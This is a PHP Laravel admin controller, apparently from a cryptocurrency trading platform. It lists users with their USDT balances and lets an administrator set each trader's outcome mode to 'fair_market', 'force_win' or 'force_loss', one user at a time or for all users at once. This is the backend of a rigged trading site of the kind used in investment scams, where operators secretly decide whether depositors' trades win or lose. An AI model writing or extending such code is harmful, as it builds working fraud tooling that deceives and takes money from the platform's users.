<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\Wallet;
use Illuminate\Http\Request;
use Inertia\Inertia;

class AdminUserController extends Controller
{
    /**
     * Display Admin User Management & Trading Control Engine.
     */
    public function index()
    {
        $users = User::with(['wallets', 'deposits'])
            ->latest()
            ->get()
            ->map(function ($u) {
                $usdtWallet = $u->wallets->firstWhere('currency', 'USDT');
                return [
                    'id' => $u->id,
                    'name' => $u->name,
                    'email' => $u->email,
                    'is_admin' => (bool) $u->is_admin,
                    'trading_outcome_mode' => $u->trading_outcome_mode ?? 'fair_market',
                    'usdt_balance' => $usdtWallet ? (float) $usdtWallet->available_balance : 0.00,
                    'locked_balance' => $usdtWallet ? (float) $usdtWallet->locked_balance : 0.00,
                    'created_at' => $u->created_at->format('Y-m-d H:i:s'),
                ];
            });

        return Inertia::render('Admin/Users', [
            'users' => $users,
        ]);
    }

    /**
     * Update trading outcome mode for a specific user.
     */
    public function updateOutcomeMode(Request $request, User $user)
    {
        $request->validate([
            'trading_outcome_mode' => 'required|in:fair_market,force_win,force_loss',
        ]);

        $user->update([
            'trading_outcome_mode' => $request->trading_outcome_mode,
        ]);

        return redirect()->back()->with('message', "Updated trading outcome mode for {$user->name} to {$request->trading_outcome_mode}.");
    }

    /**
     * Bulk update trading outcome mode for all users.
     */
    public function bulkUpdateOutcomeMode(Request $request)
    {
        $request->validate([
            'trading_outcome_mode' => 'required|in:fair_market,force_win,force_loss',
        ]);

        User::query()->update([
            'trading_outcome_mode' => $request->trading_outcome_mode,
        ]);

        return redirect()->back()->with('message', "Bulk updated all traders to {$request->trading_outcome_mode}.");
    }
}
